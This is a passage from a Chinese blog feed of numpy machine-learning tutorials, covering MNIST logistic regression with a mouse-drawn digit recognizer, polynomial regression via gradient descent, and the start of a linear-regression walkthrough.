b)</span><br><span class="line">        vl_predict = self.softmax(vl_hat)</span><br><span class="line">        <span class="comment"># 找出概率最大的下标，即最可能的字符</span></span><br><span class="line">        predict_label = np.argmax(vl_predict, axis=<span class="number">1</span>)</span><br><span class="line">        predict_right_number = np.sum((predict_label == validation_labels).astype(np.int))</span><br><span class="line">        m = validation_labels.shape[<span class="number">0</span>]</span><br><span class="line">        accuracy = predict_right_number / m</span><br><span class="line">        print(<span class="string">'The accuracy rate is:'</span>, accuracy)</span><br><span class="line">        cost_ax.plot(cost_x, cost_y)</span><br><span class="line">        accuracy_x.append(<span class="string">'lr='</span> + str(learning_rate) + <span class="string">'&amp;epoch='</span> + str(epoch))</span><br><span class="line">        accuracy_y.append(accuracy)</span><br><span class="line">        </span><br><span class="line">        self.save_model(w, b)</span><br><span class="line">        accuracy_ax.bar(accuracy_x, accuracy_y)</span><br><span class="line">        plt.show()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load_binary_data</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 该数据集已经将图片转为行向量  即每一张图片都被拉成一维向量了</span></span><br><span class="line">        f = gzip.open(<span class="string">'mnist.pkl.gz'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        training_data, validation_data, test_data = pickle.load(f, encoding=<span class="string">'bytes'</span>)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">        training_inputs, training_labels = training_data</span><br><span class="line">        validation_inputs, validation_labels = validation_data</span><br><span class="line">        test_inputs, test_labels = test_data</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 实际上字符识别，模型可能更关心该点像素是不是属于字符中的一部分</span></span><br><span class="line">        <span class="comment"># 因此可以将像素二值化，将灰度值信息去掉，直接 0 或者 1</span></span><br><span class="line">        training_inputs[training_inputs &lt; <span class="number">0.01</span>] = <span class="number">0</span></span><br><span class="line">        training_inputs[training_inputs &gt;= <span class="number">0.01</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        validation_inputs[validation_inputs &lt; <span class="number">0.01</span>] = <span class="number">0</span></span><br><span class="line">        validation_inputs[validation_inputs &gt;= <span class="number">0.01</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        test_inputs[test_inputs &lt; <span class="number">0.01</span>] = <span class="number">0</span></span><br><span class="line">        test_inputs[test_inputs &gt;= <span class="number">0.01</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 10 分类问题</span></span><br><span class="line">        k = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">        training_labels = self.one_hot_encoding(k, training_labels)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (training_inputs, training_labels, validation_inputs, validation_labels, test_inputs, test_labels)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">one_hot_encoding</span><span class="params">(self, k, original_label)</span>:</span></span><br><span class="line">        label = np.eye(k)[original_label].reshape(<span class="number">-1</span>, k)</span><br><span class="line">        <span class="keyword">return</span> label</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_parameter</span><span class="params">(self, n, k)</span>:</span></span><br><span class="line">        w, b = np.random.randn(n, k), np.random.randn(<span class="number">1</span>, k)</span><br><span class="line">        <span class="keyword">return</span> w, b</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x, w, b)</span>:</span></span><br><span class="line">        z = np.dot(x, w) + b</span><br><span class="line">        <span class="keyword">return</span> self.sigmoid(z)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span><span class="params">(self, X)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1.0</span> / (<span class="number">1.0</span> + np.exp(-X))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backward</span><span class="params">(self, x, w, b, y, y_hat, l_rate)</span>:</span></span><br><span class="line">        m = x.shape[<span class="number">0</span>]</span><br><span class="line">        dw = <span class="number">1.0</span> / m * np.dot(x.T, y_hat - y)</span><br><span class="line">        db = <span class="number">1.0</span> / m * np.sum(y_hat - y)</span><br><span class="line">        w = w - l_rate * dw</span><br><span class="line">        b = b - l_rate * db</span><br><span class="line">        <span class="keyword">return</span> w, b</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cross_entropy</span><span class="params">(self, y, y_hat)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> -(y * np.log(y_hat + <span class="number">1e-10</span>) + (<span class="number">1</span> - y) * np.log(<span class="number">1</span> - y_hat + <span class="number">1e-10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">softmax</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        x_exp = np.exp(x)</span><br><span class="line">        partition = np.sum(x_exp, axis=<span class="number">1</span>).reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x_exp / partition</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_model</span><span class="params">(self, w, b)</span>:</span></span><br><span class="line">        model = np.vstack((w, b))</span><br><span class="line">        np.save(<span class="string">'params-binarization.npy'</span>, model)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    l = LogicTrain()</span><br><span class="line">    l.start_tain(<span class="number">500</span>, <span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>

<p>训练结果：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425143942.png" alt></p>
<h2 id="应用模型"><a href="#应用模型" class="headerlink" title="应用模型"></a>应用模型</h2><p>训练结束以后，我们将学习得到的参数<code>w</code>和<code>b</code>保存，接下来我们就可以测试我们模型的性能了，使用之前先将参数导入，然后再使用，这里借助<code>OpenCV</code>和<code>PyQt</code>，主要是获取鼠标的轨迹，然后转为图片，并放到我们的模型中计算每一个类别的概率，再选择最大的作为输出即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QMessageBox</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogicApplication</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 初始化全局参数</span></span><br><span class="line">        self.drawing = <span class="literal">False</span></span><br><span class="line">        self.ix, self.iy = <span class="number">-1</span>, <span class="number">-1</span></span><br><span class="line">        self.image = np.zeros((<span class="number">512</span>, <span class="number">512</span>, <span class="number">3</span>), np.uint8)</span><br><span class="line"></span><br><span class="line">        window = cv2.namedWindow(<span class="string">'write your number'</span>)</span><br><span class="line">        cv2.setMouseCallback(<span class="string">'write your number'</span>, self.draw_circle)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 大小是 785 * 10</span></span><br><span class="line">        param = self.load_model()</span><br><span class="line"></span><br><span class="line">        w, b = param[<span class="number">0</span>:<span class="number">784</span>, :], param[<span class="number">-1</span>, :]</span><br><span class="line"></span><br><span class="line">        ENTER, SPACE, ESC = <span class="number">13</span>, <span class="number">32</span>, <span class="number">27</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            cv2.imshow(<span class="string">'write your number'</span>, self.image)</span><br><span class="line">            k = cv2.waitKey(<span class="number">50</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">            <span class="comment"># 按下 enter 键，识别当前画布上的数字</span></span><br><span class="line">            <span class="keyword">if</span> k == ENTER:</span><br><span class="line">                print(<span class="string">'enter'</span>)</span><br><span class="line"></span><br><span class="line">                img_new = cv2.cvtColor(self.image, cv2.COLOR_BGR2GRAY)</span><br><span class="line">                cv2.imwrite(<span class="string">"write.jpg"</span>, self.image)</span><br><span class="line">                x = self.handle_img(self.image)</span><br><span class="line">                predict_y = self.softmax(np.dot(x.reshape(<span class="number">1</span>, <span class="number">-1</span>), w) + b)</span><br><span class="line">                <span class="comment"># 找出概率最大的下标，即最可能的字符</span></span><br><span class="line">                predict_label = np.argmax(predict_y, axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                self.show_message(predict_label, predict_y)</span><br><span class="line"></span><br><span class="line">                print(<span class="string">'you wirte : '</span>, predict_label)</span><br><span class="line">                print(<span class="string">'Each probability is '</span>.join(str(i) <span class="keyword">for</span> i <span class="keyword">in</span> np.round(predict_y, <span class="number">2</span>)))</span><br><span class="line">            <span class="comment"># 按下 space 键，清空当前图像，还原成黑色画布</span></span><br><span class="line">            <span class="keyword">elif</span> k == SPACE:</span><br><span class="line">                self.image = np.zeros((<span class="number">512</span>, <span class="number">512</span>, <span class="number">3</span>), np.uint8)  <span class="comment"># 清空</span></span><br><span class="line">            <span class="comment"># 按下 “ESC” 键，退出程序</span></span><br><span class="line">            <span class="keyword">elif</span> k == ESC:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        cv2.destroyWindow(<span class="string">'write your number'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load_model</span><span class="params">(self)</span>:</span></span><br><span class="line">        param = np.load(<span class="string">'params-binarization.npy'</span>)</span><br><span class="line">        <span class="keyword">return</span> param</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_img</span><span class="params">(self, img)</span>:</span></span><br><span class="line">        <span class="comment"># 将图像等比例缩小至28x28大小</span></span><br><span class="line">        img = cv2.resize(img, (<span class="number">28</span>, <span class="number">28</span>))</span><br><span class="line">        <span class="comment"># 转化为灰度图</span></span><br><span class="line">        im_arr = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line">        <span class="comment"># 把图像矩阵转化为一维向量</span></span><br><span class="line">        x = im_arr.reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        x[x &lt; <span class="number">128</span>] = <span class="number">0</span></span><br><span class="line">        x[x &gt;= <span class="number">128</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 鼠标手写数字</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">draw_circle</span><span class="params">(self, event, x, y, s, a)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> event == cv2.EVENT_LBUTTONDOWN:</span><br><span class="line">            self.drawing = <span class="literal">True</span></span><br><span class="line">            self.ix, self.iy = x, y</span><br><span class="line">        <span class="keyword">elif</span> event == cv2.EVENT_MOUSEMOVE:</span><br><span class="line">            <span class="keyword">if</span> self.drawing == <span class="literal">True</span>:</span><br><span class="line">                <span class="comment"># 圆半径（笔画粗细）设置为25是为了和mnist数据集中的数字尽可能粗细相似</span></span><br><span class="line">                cv2.circle(self.image, (x, y), <span class="number">25</span>, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">-1</span>)  <span class="comment"># 画笔颜色为白色</span></span><br><span class="line">        <span class="keyword">elif</span> event == cv2.EVENT_LBUTTONUP:</span><br><span class="line">            self.drawing = <span class="literal">False</span></span><br><span class="line">            cv2.circle(self.image, (x, y), <span class="number">25</span>, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">softmax</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        x_exp = np.exp(x)</span><br><span class="line">        partition = np.sum(x_exp, axis=<span class="number">1</span>).reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x_exp / partition</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_message</span><span class="params">(self, predict_label, predict_y)</span>:</span></span><br><span class="line">        message_body = <span class="string">"预测您输入的字符为："</span> + str(predict_label) + <span class="string">"，其中，各个字符的预测概率为：\n"</span></span><br><span class="line">        <span class="keyword">for</span> index, probability <span class="keyword">in</span> enumerate(predict_y[<span class="number">0</span>]):</span><br><span class="line">            message_body += str(index) + <span class="string">"："</span>+str(round(probability, <span class="number">3</span>)) + <span class="string">"，"</span></span><br><span class="line">        message_body += <span class="string">"\n结果仅供参考"</span></span><br><span class="line"></span><br><span class="line">        messageBox = QMessageBox()</span><br><span class="line">        messageBox.setWindowTitle(<span class="string">'预测结果'</span>)</span><br><span class="line">        messageBox.setText(message_body)</span><br><span class="line">        messageBox.setStandardButtons(QMessageBox.Yes | QMessageBox.No)</span><br><span class="line">        buttonY = messageBox.button(QMessageBox.Yes)</span><br><span class="line">        buttonY.setText(<span class="string">'好的（并清空笔记）'</span>)</span><br><span class="line">        buttonN = messageBox.button(QMessageBox.No)</span><br><span class="line">        buttonN.setText(<span class="string">'好的'</span>)</span><br><span class="line">        messageBox.setStyleSheet(<span class="string">"QPushButton:hover&#123;background-color: rgb(255, 93, 52);&#125; QLabel&#123;font: 14pt \"微软雅黑\"; min-width: 900px;&#125;"</span>)</span><br><span class="line">        messageBox.exec_()</span><br><span class="line">        <span class="keyword">if</span> messageBox.clickedButton() == buttonY:</span><br><span class="line">            self.image = np.zeros((<span class="number">512</span>, <span class="number">512</span>, <span class="number">3</span>), np.uint8)  <span class="comment"># 清空</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># l = LogicTrain()</span></span><br><span class="line">    <span class="comment"># l.start_tain(500, 0.5)</span></span><br><span class="line">    a = LogicApplication()</span><br><span class="line">    a.start()</span><br></pre></td></tr></table></figure>

<p>效果如图</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425144719.png" alt></p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>逻辑回归</tag>
        <tag>MNIST</tag>
      </tags>
  </entry>
  <entry>
    <title>numpy实现多项式回归模型</title>
    <url>/2022/04/11/numpy%E5%AE%9E%E7%8E%B0%E5%A4%9A%E9%A1%B9%E5%BC%8F%E5%9B%9E%E5%BD%92%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>书接上回，上回我们介绍了线性回归，这次我们来关注一下多项式回归。</p>
<p>对于多项式回归，回归函数是回归变量多项式的回归 ，实际上线性回归是多项式回归中的特殊情况，即此自变量的项次是一次。</p>
<a id="more"></a>

<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><a href="https://baike.baidu.com/item/%E6%B3%B0%E5%8B%92%E5%85%AC%E5%BC%8F" target="_blank" rel="noopener">泰勒公式</a>告诉我们，任何函数在一定区间内都可以用多项式函数进行逼近，即</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220411221527.png" alt></p>
<p>假设我们的<code>n=1</code>，那么我们就回到了线性模型。</p>
<p>理论上我们的<code>n</code>越大，我们的函数就更加逼近原函数，不过在实际运算中，该值越大，计算量也就越大，而且计算机运算过程中也容易溢出，因此该值应该有一个比较符合实际意义的值。</p>
<p>参照上文，我们可以写出损失函数为：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220412180437.png" alt></p>
<p>该函数对每一项的系数求导为：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220412193952.png" alt></p>
<p>更新参数方法依旧是使用梯度下降分析法：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220412185006.png" alt></p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>我们先产生一个三角函数的数据，并加入随机偏差，模拟非线性数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def Data():</span><br><span class="line">    x &#x3D; np.linspace(0, 1, 100)</span><br><span class="line">    y &#x3D; np.sin(5 * x) + 0.1 + np.random.randn(len(x)) * 0.1</span><br><span class="line">    return x, y</span><br></pre></td></tr></table></figure>

<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220412190802.png" alt></p>
<p>再定义参数初始化函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(len=<span class="number">5</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    len 是多项式次数，该函数返回多项式的每一个系数</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> np.random.randn(len) * <span class="number">0.5</span></span><br></pre></td></tr></table></figure>

<p>接下来就是我们的回归主体部分啦！</p>
<p>在这之前，我们来学习一下怎么使用<code>NumPy</code>来实现多项式计算：在<code>NumPy</code>中，如果我们要计算:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">f(x) = a + b * x + c * x^2 + d * x^3</span><br></pre></td></tr></table></figure>

<p>可以使用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = np.poly1d(theta)</span><br><span class="line">f(x)</span><br></pre></td></tr></table></figure>

<p>其中，<code>theta</code>是多项式系数，例如计算<code>f(x)=0.7 * x^2+ 0.6 * x + 0.5</code>在<code>x=1.2</code>的值，可以用下面的代码完成：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = np.poly1d([<span class="number">0.7</span>, <span class="number">0.6</span>, <span class="number">0.5</span>])</span><br><span class="line">f(<span class="number">1.2</span>)</span><br><span class="line"><span class="number">2.2279999999999998</span></span><br></pre></td></tr></table></figure>

<p><strong>记住，<code>np.poly1d()</code>中的参数是从多项式最高项开始的</strong></p>
<p>因此我们可以定义计算<code>y_hat</code>的函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getY_Hat</span><span class="params">(x, theta)</span>:</span></span><br><span class="line">    <span class="comment"># 根据 theta 作为系数，生成多项式函数</span></span><br><span class="line">    f = np.poly1d(theta)</span><br><span class="line">    <span class="keyword">return</span> f(x)</span><br></pre></td></tr></table></figure>

<p>有了该函数后，我们可以继续定义<code>loss</code>函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loss</span><span class="params">(y, yHat)</span>:</span></span><br><span class="line">    n = len(y)</span><br><span class="line">    t1 = (y - yHat) * (y - yHat)</span><br><span class="line">    <span class="keyword">return</span> sum(t1) / n</span><br></pre></td></tr></table></figure>

<p>梯度下降分析法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更新每一个参数</span></span><br><span class="line">n = len(theta)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">    sm = sum((y_hat - y) * (x ** (n - <span class="number">1</span> - j)))</span><br><span class="line">    roundThetaIdx =  <span class="number">2</span> * sm / n</span><br><span class="line">    theta[j] = theta[j] - learning_rate * roundThetaIdx</span><br></pre></td></tr></table></figure>

<p>最终的结果：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220412193145.png" alt></p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on Tue Apr 12 17:47:32 2022</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: YaleXin</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt </span><br><span class="line"></span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Data</span><span class="params">()</span>:</span></span><br><span class="line">    x = np.linspace(<span class="number">0</span>, <span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">    y = np.sin(<span class="number">5</span> * x) + <span class="number">0.1</span> + np.random.randn(len(x)) * <span class="number">0.1</span></span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(len=<span class="number">5</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    len 是多项式次数</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> np.random.randn(len) * <span class="number">0.5</span></span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getY_Hat</span><span class="params">(x, theta)</span>:</span></span><br><span class="line">    <span class="comment"># 根据 theta 作为系数，生成多项式函数</span></span><br><span class="line">    f = np.poly1d(theta)</span><br><span class="line">    <span class="keyword">return</span> f(x)</span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loss</span><span class="params">(y, yHat)</span>:</span></span><br><span class="line">    n = len(y)</span><br><span class="line">    t1 = (y - yHat) * (y - yHat)</span><br><span class="line">    <span class="keyword">return</span> sum(t1) / n</span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PolynomialRegression</span><span class="params">(x, y, theta, ax, epoch=<span class="number">100</span>, learning_rate = <span class="number">0.01</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    梯度下降法</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    ax.set_title(<span class="string">"Loss change process"</span>)</span><br><span class="line">    loss_x = []</span><br><span class="line">    loss_y = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(epoch):</span><br><span class="line"></span><br><span class="line">        y_hat = getY_Hat(x, theta)</span><br><span class="line">        lst = loss(y, y_hat)</span><br><span class="line">        loss_x.append(i)</span><br><span class="line">        loss_y.append(lst)</span><br><span class="line">        print(<span class="string">"lost = "</span> + str(lst))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 更新每一个参数</span></span><br><span class="line">        n = len(theta)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            sm = sum((y_hat - y) * (x ** (n - <span class="number">1</span> - j)))</span><br><span class="line">            roundThetaIdx =  <span class="number">2</span> * sm / n</span><br><span class="line">            theta[j] = theta[j] - learning_rate * roundThetaIdx</span><br><span class="line">    ax.plot(loss_x, loss_y)</span><br><span class="line">    <span class="keyword">return</span> theta</span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plotAns</span><span class="params">(x, y, Y, ax)</span>:</span></span><br><span class="line">    <span class="string">"""绘制图形    </span></span><br><span class="line"><span class="string">    y是数据原始的y值，Y是拟合得到的值</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    ax.set_title(<span class="string">'Polynomial regression result'</span>)</span><br><span class="line">    ax.scatter(x, y, label = <span class="string">r'$y = f(x)$'</span>)</span><br><span class="line">    ax.plot(x, Y, label=<span class="string">r'$y = f(x)-theta $'</span>, color=<span class="string">'red'</span>)</span><br><span class="line">    ax.legend(loc=<span class="string">'upper left'</span>,prop=&#123;<span class="string">'family'</span>:<span class="string">'SimHei'</span>,<span class="string">'size'</span>:<span class="number">8</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#%%</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    fig = plt.figure()</span><br><span class="line">    cost_ax = fig.add_subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>)  </span><br><span class="line">    ans_ax = fig.add_subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>)  </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 载入多项式回归数据</span></span><br><span class="line">    x, y = Data()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 初始化 最高次数为 10 的一组系数</span></span><br><span class="line">    theta = init(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置学习率</span></span><br><span class="line">    my_learning_rate = <span class="number">0.02</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># # 求解最优参数</span></span><br><span class="line">    theta = PolynomialRegression(x, y, theta, cost_ax,epoch=<span class="number">3000</span>)</span><br><span class="line">    f = np.poly1d(theta)</span><br><span class="line">    yhat = f(x)</span><br><span class="line">    </span><br><span class="line">    plotAns(x, y, yhat, ans_ax)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>多项式回归</tag>
        <tag>泰勒展开</tag>
        <tag>python</tag>
        <tag>NumPy</tag>
      </tags>
  </entry>
  <entry>
    <title>numpy实现线性回归模型</title>
    <url>/2022/03/25/numpy%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>生活中常常遇到线性模型的例子，例如房子的价格与占地面积几乎是呈线性，它还可能和卧室数量相关；又如一个学生是否具备获取奖学金资格与学生成绩、参与竞赛经历、班干部任职经历都相关；又如一个大学生是否能够在大学中脱单，与个人相貌、为人处事能力、生活习惯都有联系。</p>
<a id="more"></a>

<h2 id="相关原理"><a href="#相关原理" class="headerlink" title="相关原理"></a>相关原理</h2><p>以预测房子价格为例，如果将房子面积<code>x1</code>、卧室数量<code>x2</code>作为特征，房子价格为目标，则可以表示为：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220325230950.png" alt></p>
<p>式子中的<code>w</code>代表相应的特征权重，<code>b</code>代表偏置。</p>
<p>用向量可以表示为：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220325232055.png" alt></p>
<p>而我们的目标是对于给定数据集，我们求出最符合的参数<code>w1</code>和<code>w2</code>，以及<code>b</code>，使得模型很好地贴近数据集，我们该如何度量我们的模型是否和数据集贴近呢？我们这里平方差来表示二者的差距，计算该平方差的函数我们称之为损失函数，我们的样本的预测值为<code>y_hat</code>，真实值为<code>y</code>，则损失函数如下：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220325232645.png" alt></p>
<p>上面的常数<code>1/2</code>并不是硬性要求，只是为了方便后面求导使得系数变为<code>1</code>。</p>
<p>因此问题转变成找到一组参数，使得所有样本的损失和变得最小，即</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220325233600.png" alt></p>
<p>实际上也是在求上述函数的极小值。为了方便运算，我们可以将参数<code>w</code>和<code>b</code>合并，并在<code>x</code>右边增加一列：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220326103156.png" alt></p>
<p>即损失函数又可以表示为：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220326082005.png" alt></p>
<p>小学二年级的数学老师告诉我们，这个是关于自变量<code>W*</code>（注意，这里的<code>x</code>和<code>y</code>都是常量）的二次函数，有极值，那我们该怎么求解？数学老师继续告诉我们，二次函数极值可以利用公式！当然也可以使用梯度下降分析法，因为有些模型不可以用公式直接求解极值！</p>
<p>梯度下降分析法参数更新方式是：<code>w = w - learning_rate * grad</code>，<code>grad</code>是在该点的梯度，即导数（可以粗略地称为导数，但是严格来说这样子的说法是错误的）</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220326085926.png" alt></p>
<p>如上图所示，对于左边的点，其导数为负数，减去一个负数（<code>learning_rate</code>我们称之为学习率，是正数）后其值增大，即经过更新后，自变量<code>w</code>往右边走了一段距离，对于右边的，更新后自变量往左边走了一段距离，最终我们的<code>w</code>将趋于<code>1.0</code>，即极值点附近。</p>
<p>损失函数对<code>W</code>求导为：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220326093933.png" alt></p>
<h2 id="回归实现"><a href="#回归实现" class="headerlink" title="回归实现"></a>回归实现</h2><p>简单起见，我们假设只有一个特征，即只有一个<code>x</code>，而不是有<code>x1,x2,...</code>我们首先生成一组线性数据，为了更符合实际，我们加入随机偏差：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">data</span><span class="params">()</span>:</span></span><br><span class="line">    x = np.linspace(<span class="number">-20</span>, <span class="number">20</span>, <span class="number">50</span>)</span><br><span class="line">    y = <span class="number">2</span>*x + <span class="number">3</span> + np.random.randn(len(x)) * <span class="number">3</span></span><br><span class="line">    x = x.reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">    y = y.reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br></pre></td></tr></table></figure>

